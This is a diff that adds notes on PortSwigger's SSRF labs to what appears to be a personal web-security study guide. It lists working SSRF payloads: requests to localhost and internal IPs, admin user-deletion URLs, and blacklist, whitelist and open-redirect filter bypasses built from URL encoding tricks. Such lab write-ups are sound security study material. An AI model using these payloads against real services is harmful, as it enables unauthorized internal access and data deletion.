@@ -1001,9 +1001,143 @@
 ## **Access Control**
 
 ## **File Upload Vulnerabilities**
+-->
 
-## **Server-Side Request Forgery (SSRF)**
+## **[Server-Side Request Forgery (SSRF)][ssrf]**
 
+### [Common SSRF attacks][ssrf_common_attacks]
+
+1. #### **Basic SSRF against the local server**
+
+    - Click **View details** of any product then **Check stock** and take note of the URL flow and the parameters sent.
+
+    <br>
+
+    ```plaintext
+    https://<lab_url>/product               GET     (productId=1)
+    https://<lab_url>/product/stock         POST
+                                            (stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1)
+    ```
+
+    - Send the **/product/stock POST** request to the **Repeater**.
+    - Repeat the request but changing manually the **stockApi** URL.
+
+    <br>
+
+    ```plaintext
+    stockApi=http://127.0.0.1
+    stockApi=http://127.0.0.1/admin
+    stockApi=http://127.0.0.1/admin/delete?username=carlos
+    ```
+
+2. #### **Basic SSRF against another back-end system**
+
+    ```plaintext
+    https://<lab_url>/product               GET     (productId=2)
+    https://<lab_url>/product/stock         POST    (stockApi=http://192.168.0.1:8080/product/stock/check?productId=2&storeId=2)
+    ```
+
+    ```plaintext
+    stockApi=http://192.168.0.0:8080
+    stockApi=http://192.168.0.1:8080
+    stockApi=http://192.168.0.2:8080
+    ...
+    stockApi=http://192.168.0.33:8080
+
+    stockApi=http://192.168.0.33:8080/admin
+    stockApi=http://192.168.0.33:8080/admin/delete?username=carlos
+    ```
+
+3. #### **SSRF with blacklist-based input filter**
+
+    ```plaintext
+    https://<lab_url>/product               GET     (productId=3)
+    https://<lab_url>/product/stock         POST
+                                            (stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=3&storeId=3)
+    ```
+
+    ```plaintext
+    stockApi=http://127.0.0.1                           (NO)
+    stockApi=http://127.1                               (OK)
+    stockApi=http://127.1/admin                         (NO)
+    stockApi=http://127.1/./admin                       (NO)
+    stockApi=http://127.1/%61%64%6d%69%6e               (NO, URL encode)
+
+    v1
+    stockApi=http://127.1/AdMiN                         (OK)
+    stockApi=http://127.1/AdMiN/delete?username=carlos
+
+    v2
+    stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65                         (OK, double URL encode)
+    stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos
+    ```
+
+4. #### **SSRF with whitelist-based input filter**
+
+    ```plaintext
+    https://<lab_url>/product               GET     (productId=4)
+    https://<lab_url>/product/stock         POST
+                                            (stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=4&storeId=1)
+    ```
+
+    ```plaintext
+    stockApi=http://127.0.0.1                                       "External stock check host must be stock.weliketoshop.net"
+    stockApi=http://127.1                                           "External stock check host must be stock.weliketoshop.net"
+    stockApi=http://2130706433                                      "External stock check host must be stock.weliketoshop.net"
+    stockApi=http://017700000001                                    "External stock check host must be stock.weliketoshop.net"
+    stockApi=http://0x7f000001                                      "External stock check host must be stock.weliketoshop.net"
+    stockApi=http://localhost                                       "External stock check host must be stock.weliketoshop.net"
+    stockApi=http://stock.weliketoshop.net:8080                     "Missing parameter"
+    stockApi=http://test@stock.weliketoshop.net:8080                "Missing parameter"
+    stockApi=http://test#@stock.weliketoshop.net:8080               "External stock check host must be stock.weliketoshop.net"
+    stockApi=http://test%23@stock.weliketoshop.net:8080             "External stock check host must be stock.weliketoshop.net"
+    stockApi=http://test%25%32%33@stock.weliketoshop.net:8080       500 ISE, "Could not connect to external stock check service"
+    stockApi=http://localhost%25%32%33@stock.weliketoshop.net:8080  200 OK
+
+    stockApi=http://localhost%25%32%33@stock.weliketoshop.net:8080/admin
+    stockApi=http://localhost%25%32%33@stock.weliketoshop.net:8080/admin/delete?username=carlos
+    ```
+
+5. #### **SSRF with filter bypass via open redirection vulnerability**
+
+    ```plaintext
+    https://<lab_url>/product               GET   (productId=5)
+    https://<lab_url>/product/stock         POST  (stockApi=/product/stock/check?productId=5&storeId=2)
+    https://<lab_url>/product/nextProduct   GET   (currentProductId=5&path=/product?productId=6)
+    ```
+
+    ```plaintext
+    stockApi=/product/stock/check?productId=5%26storeId=2
+    stockApi=/product/nextProduct?currentProductId=5%26path=/product?productId=6
+    stockApi=/product/nextProduct?currentProductId=5%26path=http://127.0.0.1                 (200 OK)
+    stockApi=/product/nextProduct?currentProductId=5%26path=http://192.168.0.12              (500 ISE)
+    stockApi=/product/nextProduct?currentProductId=5%26path=http://192.168.0.12:8080         (404 Not Found)
+
+    stockApi=/product/nextProduct?currentProductId=5%26path=http://192.168.0.12:8080/admin
+    stockApi=/product/nextProduct?currentProductId=5%26path=http://192.168.0.12:8080/admin/delete?username=carlos
+    ```
+
+### [Blind SSRF vulnerabilities][ssrf_blind_vulnerabilities]
+
+6. #### **Blind SSRF with out-of-band detection**
+
+```plaintext
+PENDING UNTIL I GET THE BURP SUITE PRO VERSION
+```
+
+7. #### **Blind SSRF with Shellshock exploitation**
+
+```plaintext
+PENDING UNTIL I GET THE BURP SUITE PRO VERSION
+```
+
+[ssrf]:                       https://portswigger.net/web-security/ssrf
+[ssrf_common_attacks]:        https://portswigger.net/web-security/ssrf#common-ssrf-attacks
+[ssrf_blind_vulnerabilities]: https://portswigger.net/web-security/ssrf/blind
+
+---
+
+<!--
 ## **XXE Injection**
 
 <br>
